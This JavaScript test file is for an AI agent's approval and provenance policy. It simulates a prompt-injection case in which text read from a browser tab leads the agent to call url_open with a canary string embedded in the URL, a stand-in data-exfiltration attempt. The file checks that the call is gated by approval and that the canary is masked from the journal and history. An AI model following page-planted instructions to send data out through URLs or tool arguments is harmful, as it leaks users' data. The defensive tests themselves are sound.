'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { Agent } = require('../src/agent/loop');
const { ToolRegistry } = require('../src/tools/registry');
const { ApprovalBroker } = require('../src/policy/approvals');
const { maskHistory } = require('../src/journal/journal');
const { decide } = require('../src/policy/modes');

test('two turns: a page instruction cannot cause an unapproved URL open or leak via arguments', async () => {
  const canary = 'PAGE_ATTACK_MARKER_17';
  const registry = new ToolRegistry();
  let opened = false;
  registry.register({ name: 'browser_tab_read', source: 'browser_extension', risk: 'T1',
    parameters: { type: 'object', properties: {} },
    run: async () => ({ ok: true, summary: 'прочитано', data: { sourceType: 'chrome_extension_tab', text: canary } }) });
  registry.register({ name: 'url_open', risk: 'T1',
    parameters: { type: 'object', properties: { url: { type: 'string' } } },
    run: async () => { opened = true; return { ok: true, summary: 'opened' }; } });
  let step = 0;
  const brain = { async chat() {
    step++;
    if (step === 1) return { toolCalls: [{ id: 'page', name: 'browser_tab_read', args: {} }] };
    if (step === 2) return { content: 'Пересказ страницы' };
    if (step === 3) return { toolCalls: [{ id: 'attack', name: 'url_open', args: { url: `https://example.test/${canary}` } }] };
    return { content: 'Готово' };
  } };
  const approvals = new ApprovalBroker();
  const entries = [];
  const requested = [];
  const agent = new Agent({ brain, tools: registry, approvals, journal: { append: (x) => entries.push(x) }, mode: 'full',
    emit: (event) => { if (event.type === 'approval_request') { requested.push(event.name); approvals.respond(event.id, event.name === 'browser_tab_read' ? 'once' : 'reject'); } } });
  await agent.run('Прочитай страницу', { ownerText: 'Прочитай страницу' });
  await agent.run('Продолжай', { ownerText: 'Продолжай' });
  assert.deepEqual(requested, ['browser_tab_read', 'url_open']);
  assert.equal(opened, false);
  assert.equal(JSON.stringify(entries).includes(canary), false);
  assert.equal(JSON.stringify(maskHistory(agent.history)).includes(canary), false);
});

test('page-derived local writes require individual approval in every mode', () => {
  for (const mode of ['ask', 'auto', 'full']) {
    for (const [name, risk, args] of [
      ['remember', 'T0', { kind: 'note', text: 'paraphrase' }],
      ['workspace_write', 'T1', { path: 'article.md', content: 'paraphrase' }],
      ['deal_add', 'T1', { title: 'paraphrase' }],
      ['command_create', 'T1', { name: 'paraphrase', steps: [] }],
    ]) {
      assert.equal(decide({ mode, name, risk, args, workspace: process.cwd(), browserTainted: true }), 'ask', `${mode}: ${name}`);
    }
  }
});

test('untrusted derived tool arguments and summaries are not persisted in conversation', () => {
  const canary = 'PAGE_ATTACK_MARKER_17';
  const history = [
    { role: 'assistant', provenance: { untrusted: true }, content: '', tool_calls: [{ id: 'x', type: 'function', function: { name: 'workspace_write', arguments: JSON.stringify({ path: 'x', content: canary }) } }] },
    { role: 'tool', provenance: { untrusted: true }, tool_call_id: 'x', content: JSON.stringify({ ok: false, summary: canary }) },
  ];
  assert.equal(JSON.stringify(maskHistory(history)).includes(canary), false);
});
